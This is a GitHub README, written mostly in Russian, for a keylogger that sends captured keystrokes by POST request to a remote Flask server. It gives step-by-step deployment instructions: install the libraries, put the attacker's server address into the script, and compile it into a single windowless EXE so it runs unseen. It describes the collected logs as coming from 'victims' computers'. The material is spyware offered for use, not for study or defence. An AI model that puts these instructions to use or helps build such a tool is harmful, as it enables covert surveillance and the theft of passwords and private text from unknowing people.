# POST-KeyLogger
A program that sends text written by the user to a specified endpoint using POST requests.

## Пожалуйста, ставьте звёзды на мои проекты если они вам понравились, звёзды будут продвигать репозитории, чтобы о них узнало больше человек.

# ⚙️ Установка

## 💽 POST Сервер

1. Для сервера нужен любой хостинг или компьютер который будет работать 24/7. Адрес будет доступным для любого компьютера, то есть имея белый IP или домен.

2. Установите Flask (единственная библиотека, которая понадобиться на нём):
```
pip install Flask
```

3. Скачайте и запустите программу [endpoint_server.py](https://github.com/ArtemChikc/POST-KeyLogger/blob/main/endpoint_server.py) на сервере.

## 👤 Клиент

1. Установите на свой компьютер нужные библиотеки:
```
pip install pynput keyboard
```

2. Скачайте [keylogger.pyw](https://github.com/ArtemChikc/POST-KeyLogger/blob/main/keylogger.pyw) и в строке №177 замените "http://127.0.0.1:5000" на IP или домен вашего сервера.

3. Скомпилируйте в EXE файл [keylogger.pyw](https://github.com/ArtemChikc/POST-KeyLogger/blob/main/keylogger.pyw) (рекомендуется через auto-py-to-exe, так проще):
```
ONE FILE | NO WINDOW
```

4. После запуска программы на каком-либо компьютере и ввода текста с клавиатуры на сервере возле файла [endpoint_server.py](https://github.com/ArtemChikc/POST-KeyLogger/blob/main/endpoint_server.py) появится папка с логами ввода различных компьютеров жертв.
